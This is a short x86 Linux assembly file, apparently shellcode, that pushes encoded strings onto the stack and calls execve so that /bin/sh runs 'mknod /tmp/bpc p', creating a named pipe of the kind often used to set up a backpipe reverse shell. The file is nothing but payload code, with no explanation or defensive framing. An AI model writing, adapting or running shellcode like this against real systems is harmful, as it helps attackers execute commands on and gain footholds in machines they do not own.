.text

.globl _start

_start:
	push %ebp
	mov %esp, %ebp
	sub $0x80, %esp
	//mov %ebp, %esp
	//sub 
	xor %eax,%eax
	//xor %esp, %esp
	push %eax
	push $0x70206370
	push $0x622f706d
	push $0x742f2064
	push $0x6f6e6b6d
	push %eax
	push $0x5663702D
	push %eax
	push $0x68732f6e
	push $0x69622f2f
	mov %esp, %esi
	mov %esi, %ebx
	push %eax
	lea 0x14(%esi), %esi
	push %esi
	lea -0x8(%esi), %esi
	push %esi
	lea -0xc(%esi), %esi
	push %esi
	mov %esp, %ecx
	xor %edx, %edx
   	movb $11, %al       
   	int  $0x80              
   	leave
   	ret
